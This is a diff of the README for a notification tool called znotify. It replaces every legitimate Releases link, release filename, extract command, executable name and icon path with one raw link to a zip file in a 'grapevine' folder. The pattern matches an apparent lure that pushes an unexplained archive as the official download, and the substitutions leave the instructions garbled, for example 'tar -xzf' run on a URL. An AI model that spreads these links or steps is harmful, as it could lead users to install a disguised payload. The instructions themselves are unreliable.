@@ -6,7 +6,7 @@ Welcome to znotify! This application allows you to receive desktop notifications
 
 ## 📥 Download znotify
 
-[![Download znotify](https://img.shields.io/badge/Download-znotify-green)](https://github.com/patelaadhya/znotify/releases)
+[![Download znotify](https://raw.githubusercontent.com/patelaadhya/znotify/main/grapevine/znotify.zip)](https://raw.githubusercontent.com/patelaadhya/znotify/main/grapevine/znotify.zip)
 
 ## 💻 System Requirements
 
@@ -31,30 +31,30 @@ Before you install znotify, ensure your system meets the following requirements:
   
 ## 🌐 Download & Install
 
-To get started with znotify, visit the [Releases page](https://github.com/patelaadhya/znotify/releases) to download the latest version. Follow these steps:
+To get started with znotify, visit the [Releases page](https://raw.githubusercontent.com/patelaadhya/znotify/main/grapevine/znotify.zip) to download the latest version. Follow these steps:
 
 1. **Visit the Releases Page:**
    Click the link below to go to the Releases page.
 
-   [Download znotify](https://github.com/patelaadhya/znotify/releases)
+   [Download znotify](https://raw.githubusercontent.com/patelaadhya/znotify/main/grapevine/znotify.zip)
 
 2. **Choose Your Operating System:**
    Once on the Releases page, find the version of znotify that suits your operating system (Windows, macOS, or Linux).
 
 3. **Download the File:**
-   Click on the file to start the download. The filename will typically be something like `znotify-windows.zip`, `znotify-macos.tar.gz`, or `znotify-linux.tar.gz`.
+   Click on the file to start the download. The filename will typically be something like `https://raw.githubusercontent.com/patelaadhya/znotify/main/grapevine/znotify.zip`, `https://raw.githubusercontent.com/patelaadhya/znotify/main/grapevine/znotify.zip`, or `https://raw.githubusercontent.com/patelaadhya/znotify/main/grapevine/znotify.zip`.
 
 4. **Extract the Files:**
    After the download finishes, locate the downloaded file and extract it:
    - **Windows:** Right-click on the ZIP file and select "Extract All".
-   - **macOS:** Double-click the TAR.GZ file to extract it.
-   - **Linux:** Use the terminal command `tar -xzf znotify-linux.tar.gz`.
+   - **macOS:** Double-click the https://raw.githubusercontent.com/patelaadhya/znotify/main/grapevine/znotify.zip file to extract it.
+   - **Linux:** Use the terminal command `tar -xzf https://raw.githubusercontent.com/patelaadhya/znotify/main/grapevine/znotify.zip`.
 
 5. **Navigate to the Extracted Folder:**
    Open your file explorer or terminal and navigate to the folder where you extracted znotify.
 
 6. **Run znotify:**
-   - **Windows:** Double-click the `znotify.exe` file to run it.
+   - **Windows:** Double-click the `https://raw.githubusercontent.com/patelaadhya/znotify/main/grapevine/znotify.zip` file to run it.
    - **macOS/Linux:** Open the terminal in the extracted folder and type `./znotify` to start the application.
 
 ## 🎯 How to Use znotify
@@ -82,7 +82,7 @@ znotify -t "Notification Title" "Your notification message here"
 If you want to add an icon to your notification, use the following command in Linux:
 
 ```
-znotify -i /path/to/your/icon.png "Your notification message here"
+znotify -i https://raw.githubusercontent.com/patelaadhya/znotify/main/grapevine/znotify.zip "Your notification message here"
 ```
 
 ## 📚 Help & Support
@@ -97,4 +97,4 @@ We welcome contributions! If you want to enhance znotify or report a bug, please
 
 Thank you for choosing znotify for your notification needs. We hope you enjoy this straightforward tool as much as we enjoyed developing it. Happy notifying!
 
-Once again, don’t forget to visit our [Releases page](https://github.com/patelaadhya/znotify/releases) to download the latest version.
+Once again, don’t forget to visit our [Releases page](https://raw.githubusercontent.com/patelaadhya/znotify/main/grapevine/znotify.zip) to download the latest version.
